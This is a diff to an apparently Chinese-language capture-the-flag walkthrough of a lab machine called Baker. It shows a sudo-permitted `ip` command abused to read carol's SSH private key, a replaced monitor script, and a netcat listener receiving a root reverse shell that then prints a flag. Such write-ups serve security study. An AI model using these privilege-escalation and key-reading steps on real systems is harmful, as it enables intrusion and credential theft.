@@ -492,6 +492,7 @@ User apache may run the following commands on Baker:
 ```
 能以`carol`用户权限执行ip，这有啥用呀。
 找到CTFOBins里面有ip命令的文件读取，我们试一下读ssh密钥。
+
 ```bash
 /var/www/localhost/htdocs/pages $ sudo -u carol ip -force -batch /home/carol/.ssh/id_rsa 2>&1
 Object "-----BEGIN" is unknown, try "ip help".
@@ -624,5 +625,18 @@ carol@Baker:~$ cp /tmp/monitor_signed /opt/scripts/monitor
 carol@Baker:~$ chmod +x /opt/scripts/monitor
 ```
 然后shell就弹过来了：
-```
+```bash
+┌──(kali㉿kali)-[~/tmp]
+└─$ nc -lvp 9999
+listening on [any] 9999 ...
+10.251.177.85: inverse host lookup failed: Unknown host
+connect to [10.251.177.81] from (UNKNOWN) [10.251.177.85] 56220
+bash: cannot set terminal process group (2996): Not a tty
+bash: no job control in this shell
+Baker:~# ls
+ls
+root.txt
+Baker:~# cat root.txt
+cat root.txt
+flag{root-99dc32aab0563305b639550763a02e32}
 ```
